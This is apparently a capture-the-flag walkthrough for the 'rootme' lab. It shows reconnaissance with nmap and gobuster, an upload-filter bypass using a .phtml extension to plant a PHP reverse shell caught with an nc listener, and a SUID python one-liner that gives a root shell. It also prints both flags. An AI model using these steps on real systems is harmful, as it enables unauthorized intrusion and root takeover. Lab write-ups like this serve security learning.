## rootme

### Tasks

1. **Deploy the machine**

    - Just deploy the machine. 

2. **Reconnaissance**

    - How many ports are open?

      This task is quite easy; a default `nmap` scan would suffice.

      ```bash
      nmap $IP
      ```

      There are 2 ports open: port 22 and port 80. Port 22 is generally used for SSH and port 80 is used for HTTP Web Servers.

    - What version of Apache is running?

      We can use `nmap` with the `-sV` option (which determines service/version info running on open ports). To make things faster, we can also specify the ports 80 and 22 (using the `-p` option).

      ```bash
      nmap -sV -p 80,22 $IP
      ```

      Apache Version: 2.4.29

    - What service is running on port 22?

      A service scan using `nmap` will tell us the service running on port 22 is SSH.

    - Find directories on the web server using the GoBuster tool.

      Gobuster is used to brute-force hidden directories on web servers based on a wordlist. If you don't have a wordlist, you can download it [here](https://github.com/digination/dirbuster-ng/blob/master/wordlists/common.txt). Alternatively, download it directly from the terminal:

      ```bash
      wget https://raw.githubusercontent.com/digination/dirbuster-ng/master/wordlists/common.txt
      ```

      ```bash
      gobuster dir --url $IP --wordlist $WORDLIST_PATH
      ```

      Gobuster finds some directories like `/panel/` and `/uploads/`. `/panel/` is the answer to the task.

3. **Getting a Shell**

    Now we have to find the user flag, which is in some file named `user.txt` (mentioned in the task). 

    Going to the `/panel` endpoint, we find that we can upload files there. At this point, the first thing that comes to mind is that there might be a file upload vulnerability. We tried uploading a file with a `.php` extension, but the website refuses to accept the file. We then tried changing the extension to `.png.php`, `.php3`, and `.phtml`. Changing the extension to `.phtml` bypasses the security check, and our file is uploaded. (A file with the `.php3` extension is also uploaded but is not executed on the web server.)

    We can use this vulnerability to get a reverse shell. We can use the PHP reverse shell script by pentestmonkey, which can be found [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Don't forget to change the IP and port on which you want to listen.

    Upload the `php-reverse-shell` script to the web server (with the `.phtml` extension). 

    Listen on the port (e.g., 1234) for incoming connections:

    ```bash
    nc -lnvp 1234
    ```

    Execute the script on the server by visiting `/uploads/<REV_SHELL_SCRIPT.phtml>`.

    Check the `nc` session. Bingo, you get the reverse shell.

    The user flag is in `/var/www/user.txt`. You can use the `find` command to locate the file:

    ```bash
    find / -name user.txt 2>/dev/null
    ```

    The flag: `THM{y0u_g0t_a_sh3ll}`

4. **Privilege Escalation**

    - Search for files with SUID permission. Which file is weird?

      We can find files with SUID permission using the `find` command:

      ```bash
      find / -perm -u=s 2>/dev/null
      ```

      Answer: `/usr/bin/python`

    - Find a form to escalate your privileges.

      We find that `python` has the setuid bit set and the owner is root. We can use this to escalate our privileges. Searching about the vulnerability on gtfobins, we find that it can be exploited easily:

      ```bash
      python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
      ```

      This gives us a root shell. Going to the root home directory, we find the flag in `root.txt`.

    - `root.txt`

      The flag: `THM{pr1v1l3g3_3sc4l4t10n}`

